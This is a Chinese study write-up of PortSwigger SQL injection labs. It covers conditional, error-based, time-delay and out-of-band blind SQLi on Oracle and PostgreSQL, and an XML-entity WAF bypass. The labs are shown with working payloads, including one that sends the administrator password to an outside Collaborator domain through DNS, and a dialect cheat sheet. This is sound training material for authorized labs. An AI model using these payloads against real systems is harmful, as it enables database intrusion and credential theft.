# 2026-09-23 PortSwigger SQL 注入模块收官 — 盲注四代信道与 XML 编码绕过 WAF

> 状态：✅ 实操过（盲注四代信道 + WAF 编码绕过全部亲手打通；**SQL 注入模块 18/18 通关**）

## 一、这轮做的事

| Lab | 难度 | 信道/考点 | 结果 |
|---|---|---|---|
| Blind SQL injection with conditional responses | P | 盲注①**内容信道**（MySQL 系） | ✅ |
| Blind SQL injection with conditional errors | P | 盲注②**报错信道**（Oracle） | ✅ |
| Blind SQL injection with time delays and information retrieval | P | 盲注③**延时信道**（PostgreSQL） | ✅ |
| Blind SQL injection with out-of-band interaction | P | 盲注④**带外信道**（Oracle） | ✅ |
| Blind SQL injection with out-of-band data exfiltration | P | 盲注④带外**带数据**（Oracle） | ✅ |
| SQL injection with filter bypass via XML encoding | P | **WAF 绕过**（编码层差） | ✅ |

至此 SQL 注入模块 18 关全部通关（Lab 1-10 见进度文件，本模块早期完成）。

---

## 二、⭐ 决策卡一：盲注 = 换信道，不换骨架

盲注不是「另一种 payload 写法」，而是**判定信道的选择问题**。骨架永远是同一套，只是「条件为真」这件事在页面上**以什么形式表现出来**不同：

| 代 | 信道 | 判定信号 | 什么时候逼你用这一代 |
|---|---|---|---|
| 1 | 内容 | 页面多/少一行字（`Welcome back`） | 查询结果能影响正常渲染 |
| 2 | 报错 | HTTP 500 / 自定义错误页 | 应用把数据库报错暴露出来 |
| 3 | 延时 | 响应耗时（10s vs 0s） | 无回显、无报错，但查询**同步**执行 |
| 4 | 带外 OOB | Collaborator 收到 DNS/HTTP | 连延时都不可靠（查询**异步**、不阻塞响应） |

**骨架三段（四代通用）**：

```
① 存在性：AND (SELECT 'a' FROM users WHERE username='administrator')='a
② 长度  ：... AND LENGTH(password)>N        ← Repeater 递增，最后一个为真的数就是长度
③ 逐位  ：... SUBSTRING(password,N,1)='§a§' ← Intruder，payload list = a-z + 0-9
```

**动手前必须做「真假对照」自证信道**（否则后面全是噪声）：

| 信道 | 一对探针 | 期望 |
|---|---|---|
| 内容 | `' AND '1'='1` / `' AND '1'='2` | Welcome back 出现 / 消失 |
| 报错 | `1=1` / `1=2`（CASE 包裹） | 500 / 200 |
| 延时 | `1=1` / `1=2` | ~10s / 立即返回 |
| 带外 | payload 域指向我自己的 Collaborator | Poll now 有 / 无记录 |

---

## 三、⭐ 决策卡二：payload 怎么接进原语句（四种接法）

这是我这轮最大的收获 —— **同一个「条件向量」，用哪种语法接进原查询，是有硬性前提的**：

| 接法 | 语法身份 | 前提 | 失效特征 → 自救 |
|---|---|---|---|
| `AND` / `OR` | 原 WHERE 里的**布尔连接词** | 表达式必须返回 **boolean** | PG 的 `pg_sleep()` 返回 `void` → `argument of AND must be type boolean, not type void`，**解析期就死**（不是被拦）→ 换堆叠 / 包一层子查询 |
| `UNION` | 把另一条 SELECT 的**结果集接上去** | ①列数/类型对齐 ②**结果会被显示出来** | 盲注天然不适用（不回显，拼上去没人看）；且 `void` 不能当列 |
| `\|\|` 拼接 | 原表达式里的**字符串拼接** | 只能注入一个表达式 + 自己**配平首尾引号** | 忘写尾部 `\|\|'` → 语法错（原语句的收尾引号没人配对） |
| `;` **堆叠** | **结束当前语句、另起一条完整语句** | 数据库 **+ 驱动**都允许多语句 | 报错 / 无延时 = 驱动不允许多语句（MySQL `mysqli_query` 单语句、PDO 预处理）→ 退回拼接路线 |
| `-- ` 注释 | 吃掉原语句剩余部分 | 注释符后面必须有空格（URL 里 `--+` / `--%20`） | Oracle/SQLite 只认 `-- ` 和 `/**/`，**不认 `#`** |

> **一句话判据：选哪种接法 = ①我的表达式返回什么类型 ②注入点在语法树的哪个位置 ③有没有回显。**

---

## 四、逐关 writeup

### 4.1 conditional responses（盲注① 内容信道）

**题目**：TrackingId cookie 被拼进查询，但查询结果不返回；**查询返回了行**时页面渲染 `Welcome back`。

**过程**
```
TrackingId=xyz' AND '1'='1     → Welcome back 出现（信道自证）
TrackingId=xyz' AND '1'='2     → 消失
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a                                  → 确认 users 表存在
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a           → 确认用户存在
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'
```
**怎么找到命中的那条**：Intruder → **Settings → Grep - Match** 清空后只加 `Welcome back` → 结果表出现同名列，**打勾那行就是答案**（别靠 Content-Length 肉眼比）。
**结果**：长度 20，逐位 36 个候选（a-z+0-9）推出密码 → 登录过关。

### 4.2 conditional errors（盲注② 报错信道，Oracle）

**题目**：查询返回行与否**不再影响响应**，但出错时返回自定义错误页（Hint 明说 Oracle）。

**过程（关键是先定方言 + 造"条件性报错"）**
```
xyz'                                   → 报错（引号没闭合）
xyz''                                  → 不报错（确认是引号类语法错）
xyz'||(SELECT '' FROM dual)||'         → 不报错 = Oracle（无表查询必须 from dual）
xyz'||(SELECT '' FROM not-a-real-table)||'  → 报错 = 我的输入确实进了 SQL 解析器
xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'   → 不报错 = users 表存在
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   → 500
xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   → 200
xyz'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
xyz'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
```
**为什么是 `'||(...)||'` 这个夹心结构**
- 头 `'||`：闭合原字符串 + 拼上子查询的值
- 尾 `||'`：再拼个空串，**让原语句最后那个引号仍然有配对**（少写必语法错）
- 里层 `ROWNUM = 1`：子查询必须只返回**一行**，多行拿不到标量 → 拼接炸掉

**怎么找命中的那条**：看 **Status 列** —— 命中 = **500**，没中 = 200（比上一关更省事，不用配 Grep）。
**结果**：长度 20，`SUBSTR` 逐位推出密码 → 登录过关。

### 4.3 time delays and information retrieval（盲注③ 延时信道，PostgreSQL）

**题目**：查询**异步执行**，不影响响应 → 只剩耗时这一条信道。

**我的 payload（也是官方解）**
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
→ 用户存在：... CASE WHEN (username='administrator') ... END FROM users--
→ 长度    ：... CASE WHEN (username='administrator' AND LENGTH(password)>1) ... 
→ 逐位    ：... CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') ...
```
**逐片段理解**：`x'` 闭合原字符串 → `%3B` 是 `;`（**必须编码**：cookie 头里 `;` 是分隔符）→ 后面是一条**完整独立的 SELECT**（所以不用管原查询几列、什么类型）→ `--` 把原语句剩下的部分连同收尾引号**全注释掉**（这就是堆叠相对拼接的最大红利，不用配平引号）。

**怎么找到命中的那条（本关的胜负手）**
1. Intruder → **Resource pool → Maximum concurrent requests = 1**（官方明说：为可靠起见必须单线程；服务端连接池小的时候，正在 sleep 的请求会把同批请求一起堵住 → 全表都像 10 秒）
2. 结果表看 **`Response received`** 列：正常行几十~几百 ms，**约 10,000 ms 的那一行**就是答案，其 payload 即该位字符
3. 改 `SUBSTRING(password,1,1)` 里的偏移量 1→2→3… 逐位推进

**我踩的坑（值得单独记）**：括号位置错了 ——
```
❌ ... CASE WHEN ((username='administrator' AND SUBSTRING(password,1,1))='a') ...
   括号在 ='a' 之前闭合 → boolean AND text + boolean = text → 解析期报错、立即返回
✅ ... CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') ...
   括号包住整个谓词，='a' 在括号里面
```
后果是**整轮攻击里一行 10 秒都没有** —— 判定信号全哑时，第一反应该是「我这条 payload 自己是不是错的」，而不是继续翻结果表。

**结果**：长度 20，逐位推出密码 → 登录过关。

### 4.4 out-of-band interaction（盲注④ 带外信道，Oracle）

**题目**：查询异步执行且无任何响应差异；目标 = **让 Burp Collaborator 收到一次 DNS 查询**（不用带数据）。官方 Note：防火墙只放行**默认公共** Collaborator（`*.oastify.com`）。

**payload（SQLi × XXE 组合拳）**
```
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLAB-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
**为什么绕道 XXE**：数据库默认**没有「发一个 DNS」的现成函数**（Oracle 的 `UTL_INADDR`/`UTL_HTTP` 需要额外权限且常被锁）→ 借**数据库里能解析 XML 的函数**（`xmltype` + `EXTRACTVALUE`），让 XML 解析器去**取外部 DTD** → 解析器自己发起 DNS + HTTP 请求。

**操作四步**：抓带 TrackingId 的请求 → Repeater → 右键 `Insert Collaborator payload` 填自己的唯一子域 → Send → Collaborator **Poll now** 出现 DNS 记录即过关。
**坑**：必须用默认公共 Collaborator；空面板 ≠ payload 错（先做通路自测：自己浏览器访问那个域再 Poll，判断 Burp↔Collaborator 出网是否正常）。

### 4.5 out-of-band data exfiltration（盲注④ 带外 + 带数据）

**唯一的关键改动**：把上一条里**静态的域名中段**换成**子查询的返回值** ——
```
"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.COLLAB-SUBDOMAIN/"
```
至此 **DNS 查询本身成了数据搬运工**：趁目标「被迫访问外部域名」时把数据夹带在域名里带出去。

**取值位置（容易看错）**
```
xazufqbjsfojakx672si . 2nkdw8wlptb8djwp1qgrntzjlgigz . oastify.com
└──── 数据(密码) ────┘ └── Collaborator 唯一子域(信箱号) ─┘ └ 公共服务器 ┘
```
- **最左那一段才是数据**；右边那串**32 位小写字母数字**是 Collaborator 给你的唯一子域（`Generate/Insert payload` 时拿到的"信箱号"，用来区分是哪次注入/哪个 payload 触发的，每次生成都不同）
- 读取位置：**DNS 记录的 Description**（完整被查询的域名）/ **HTTP 记录的 Host 请求头**

**我踩的坑：双编码**
```
❌ <%253fxml+version%3d"1.0"+encoding%253d"UTF-8"%3f>   ← %253f 多编了一层
✅ <%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
```
`%` 本身要写成 `%25`，所以服务端解一层后，`%253f` 得到的是**字面文本 `%3f`**（不是 `?`）→ XML 声明非法 → `xmltype()` 报错 → **一个数据包都发不出去**。
**判据**：看到 `%25` 就问自己「**这个位置该不该出现一个真的 `%` 字符**」—— 该（如 DTD 里的 `%25remote%3b`）就对，不该就是编多了。

**排错第一刀（OOB 通用）**：先看**响应状态码**把问题二分 —— **500 = 我的 payload 自己写错了**（修 payload，别翻 Collaborator）；**200 但无记录 = SQL 通了、出网没到**（才查 Collaborator/出网/防火墙）。更省事的自测：把子查询换成静态字符串 `'test'`，还收不到就 100% 是 payload/编码问题。
**结果**：Collaborator 收到 DNS+HTTP，密码读出 → 登录过关。

### 4.6 filter bypass via XML encoding（WAF 绕过）

**题目**：stock check 功能把 `productId`/`storeId` 以 **XML body** 形式提交（`POST /product/stock`），结果回显 → 可 UNION；但**中间有 WAF**。

**过程**
```
<storeId>1+1</storeId>                  → 返回 2 号店的库存 = 我的输入被当 SQL 表达式求值了
                                          （数字型注入最干净的判定法：让算术式说话，不用引号）
<storeId>1 UNION SELECT NULL</storeId>  → 被 WAF 拦截（统一 blocked 文案 = 特征命中，不是应用报错）
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
                                        → 正常返回 + 一串 用户名~密码
```
**绕过原理（本关唯一需要想明白的事）**：**两个解码器，WAF 站在第一个前面**
```
我发的字节 → ①WAF(只看原始字节) → ②XML 解析器(还原实体) → ③拼进 SQL → 数据库
  &#x55;&#x4e;&#x49;&#x4f;&#x4e;      ← 只看到数字              UNION      ← 看到真词
```
→ **过滤发生在解码之前，利用发生在解码之后**。
**操作**：装 Hackvertor 扩展（BApp Store）→ 选中 payload → 右键 `Extensions → Hackvertor → Encode → hex_entities` → 它自动包成 `<@hex_entities>…</@hex_entities>`（**Repeater 里显示明文，实际发出的是编码后的**，别以为没生效）。
**细节**：这关原查询**只有 1 列**（试 2 列会返回 `0 units`，这就是它的"报错"信号）；单列里塞两个值要用 `||` 拼接 + **数据里不会出现的分隔符** `~`。
**结果**：拿到 administrator 凭据登录过关。

---

## 五、方言矩阵（盲注最常撞的 7 行）

| | MySQL | SQLite | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|---|---|
| 无表查询 | ✅ `select 1` | ✅ | ✅ | ❌ **必须 `from dual`** | ✅ |
| 拼接 | `concat()` / `0x3a` | `\|\|` / `char(58)` | `\|\|` | `\|\|` / `chr(58)` | `+` |
| 截子串 | `SUBSTRING` | `substr` | `SUBSTRING`/`SUBSTR` | **`SUBSTR`**（不认 SUBSTRING） | `SUBSTRING` |
| 注释 | `#` `-- ` `/**/` | 只有 `-- ` `/**/` | `-- ` `/**/` | 只有 `-- ` `/**/` | `-- ` `/**/` |
| 限行 | `LIMIT` | `LIMIT` | `LIMIT` | **`ROWNUM`** | `TOP` |
| 延时原语 | `sleep(5)` | ❌ 没有 | `pg_sleep(5)` | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:5'` |
| 报错原语 | `updatexml()` | 基本没有 | `1/0` 类型错 | **`TO_CHAR(1/0)`** → ORA-01476 | `convert(int,…)` |
| 表名列名大小写 | 看建表 | 不敏感 | 小写 | 未加引号建的 → **全大写** | 不敏感 |

> 判别铁律：**报错原文 > 行为差异 > 栈指纹**。「`database()` 报 no such function」不是注入失败，是方言暴露。

---

## 六、方法论沉淀

1. **盲注是信道选择问题，不是 payload 问题**：骨架（存在性→长度→逐位）四代不变，只换「条件怎么变成可见信号」。信道选法 = 看响应里还能拿到什么（内容 → 报错 → 耗时 → 带外）。
2. **动手前用一对真假探针自证信道**；一旦判定信号全哑，先怀疑**自己的 payload**（这轮我在延时关踩过：括号错 → 全程没有 10 秒的行，白找半天）。
3. **payload 接进原语句有硬性前提**（类型 / 位置 / 有没有回显），四种接法各有失效特征 —— 见第三节决策卡。
4. **编码层数 = 解码层数**：数清楚数据要经过几个解析器，每层都是可用的编码层（WAF 在第一个解码器前面 → 过滤在解码前、利用在解码后）。同一条心法正反两面都用到了：`%253f`（编多了）失败、`hex_entities`（故意多编）成功。
5. **OOB 排错第一刀看状态码**：500 = payload 自错，200 无记录 = 出网问题。别盯着 Collaborator 猜。
6. **数字型注入最干净的判定 = 让算术表达式说话**（`1+1` → 2 号店库存）。
7. **单列多值需要一个「数据里不会出现的分隔符」**（`~`、`char(58)`/`CHR(58)`），这和 UNION 只有一列回显位时用 `concat` 是同一个问题。

## 待实践

- [ ] Hackvertor 的 `dec_entities` 与 `hex_entities` 区别；**不装扩展时**手工把 payload 编成 XML 实体的最省事做法（备用路线）
- [ ] 本机起一个 PG，实测 `WHERE x AND pg_sleep(10)` 的类型报错原文（把"为什么 AND 不行"从推理变成亲眼看）
- [ ] 带外带数据遇到**大写/特殊字符**时的处理（DNS 会小写化、域名有长度限制 → hex 编码 / `SUBSTR` 分段 / 多级子域），真目标场景待练
- [ ] Oracle 无 XML 解析权限时的替代出网原语（`UTL_INADDR` / `UTL_HTTP` 的权限要求）

## 关联笔记

- [PortSwigger-Lab-做题进度.md](./PortSwigger-Lab-做题进度.md) — 模块进度与逐关手法表
- [2026-07-26-SQL注入入门.md](./2026-07-26-SQL注入入门.md) — 注入类型（数字/字符/搜索型）、Union、information_schema
- [2026-07-27-高权限注入与文件操作.md](./2026-07-27-高权限注入与文件操作.md) — 跨库/读写文件
- [2026-07-30-SQL注入WAF绕过.md](./2026-07-30-SQL注入WAF绕过.md) — 双写/大小写/内联注释/编码绕过（对照本轮的 XML 实体编码）
- [2026-08-02-SQLi-Labs进阶与注入点识别.md](./2026-08-02-SQLi-Labs进阶与注入点识别.md) · [2026-08-03-SQLi-Labs-Less21-25进阶.md](./2026-08-03-SQLi-Labs-Less21-25进阶.md)
- [2026-09-12(续)-PortSwigger-SSRF前三关与Collaborator.md](./2026-09-12(续)-PortSwigger-SSRF前三关与Collaborator.md) — Collaborator 认知（唯一子域/四步套路/三通道对比），本轮 OOB 两关直接复用

> ⚠️ 声明：以上 payload 与手法仅用于**授权环境**（PortSwigger 靶场 / CTF / 授权渗透测试），未经授权使用属违法行为。
